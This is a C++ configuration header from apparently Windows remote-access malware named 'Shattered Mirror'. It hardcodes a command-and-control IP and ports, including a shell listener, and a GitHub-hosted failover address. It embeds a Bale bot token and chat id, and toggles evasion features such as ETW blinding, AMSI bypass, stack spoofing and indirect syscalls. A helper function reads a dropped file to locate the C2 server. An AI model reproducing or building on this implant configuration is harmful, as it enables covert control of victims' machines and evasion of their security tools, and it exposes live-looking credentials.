#pragma once
#include <stdio.h>
#include <windows.h>


/*
 * SHATTERED MIRROR: DYNAMIC CONFIGURATION HEADER
 */

namespace Config {
/* C2 ENDPOINT SETTINGS */
static const char *C2_DOMAIN = "151.235.222.136";
static const int PUBLIC_PORT = 6767; // External: Bouncer listens here
static const int FLASK_PORT = 6970;  // Internal: Flask telemetry server
static const int SHELL_PORT = 4444;  // Internal: Shell session listener

/* FAILOVER: Raw GitHub URL to a text file containing IP:PORT */
/* LO just uploads a text file with "1.2.3.4:443" to this URL */
static const char *FAILOVER_URL =
    "https://raw.githubusercontent.com/USER/REPO/main/config.txt";
static const int FAILOVER_CHECK_INTERVAL =
    30; // seconds between failover checks
static const int PRIMARY_MAX_FAILS =
    3; // consecutive fails before checking failover


static const char *PSK_ID = "aNqlyob58A751Kam";

/* EVASION SETTINGS */
static const bool ENABLE_ETW_BLIND = true;
static const bool ENABLE_AMSI_BYPASS = true;
static const bool ENABLE_STACK_SPOOF = true;

/* BALE BOT SETTINGS */
static const char *BALE_BOT_TOKEN =
    "1041545482:UXM5NwT22QfsJKYJsqPPKsNcnwh-QSI9Lak";
static const char *BALE_CHAT_ID = "143703346";

/* DEBUG SETTINGS */
static const bool ENABLE_DEBUG_CONSOLE = true; // Turned OFF per user request
static const bool LOGGING_ENABLED = true;      // Global logging toggle
static const char *LOG_FILE_PATH = "log\\shattered_debug.log";

// Central Kill-Switch for all debug/tracing file output
#define DISABLE_ALL_LOGS

/* AUTO-START ATOMS */
static const DWORD AUTO_START_ATOMS[] = {4, 12, 1}; // AMSI -> Bale -> Net
static const int AUTO_START_COUNT =
    sizeof(AUTO_START_ATOMS) / sizeof(AUTO_START_ATOMS[0]);

/* -----------------------------------------------------------------------
 * GetActiveC2Target — SINGLE SOURCE OF TRUTH for all atoms.
 * Priority:
 *   1. sm_net.cfg (written by Bale bot when IP changes) — PRIMARY
 *   2. Hardcoded C2_DOMAIN / PUBLIC_PORT — SECONDARY (fallback)
 * Call this before ANY outbound connection to C2.
 * ----------------------------------------------------------------------- */
static inline void GetActiveC2Target(char *outDomain, int domainBufSize,
                                     int *outPort) {
  FILE *f = NULL;
  fopen_s(&f, "C:\\Users\\Public\\sm_net.cfg", "r");
  if (f) {
    char tmpDomain[256] = {0};
    int tmpPort = 0;
    if (fscanf_s(f, "%255[^:]:%d", tmpDomain, (unsigned)sizeof(tmpDomain),
                 &tmpPort) == 2 &&
        tmpDomain[0] != '\0' && tmpPort > 0) {
      strcpy_s(outDomain, domainBufSize, tmpDomain);
      *outPort = tmpPort;
    } else {
      // File exists but bad format — use hardcoded
      strcpy_s(outDomain, domainBufSize, C2_DOMAIN);
      *outPort = PUBLIC_PORT;
    }
    fclose(f);
  } else {
    // No file — Bale hasn't updated yet, use compiled defaults
    strcpy_s(outDomain, domainBufSize, C2_DOMAIN);
    *outPort = PUBLIC_PORT;
  }
}

} // namespace Config

// // // // // // // // // //






#define ATOM_1_ENABLED
#define ATOM_2_ENABLED
#define ATOM_3_ENABLED
#define ATOM_4_ENABLED
#define ATOM_5_ENABLED
#define ATOM_6_ENABLED
#define ATOM_7_ENABLED
#define ATOM_8_ENABLED
#define ATOM_9_ENABLED
#define ATOM_10_ENABLED
#define ATOM_11_ENABLED
#define ATOM_12_ENABLED
#define ATOM_13_ENABLED
#define ATOM_14_ENABLED
#define FEATURE_ETW_BLIND_ENABLED
#define FEATURE_AMSI_BYPASS_ENABLED
#define FEATURE_STACK_SPOOF_ENABLED
#define FEATURE_INDIRECT_SYSCALLS_ENABLED
#define FEATURE_IPC_CHANNEL_ENABLED
#define FEATURE_PROXY_LOGIC_ENABLED
#define FEATURE_ATOM_MANAGER_ENABLED
#define FEATURE_VEH_HANDLER_ENABLED
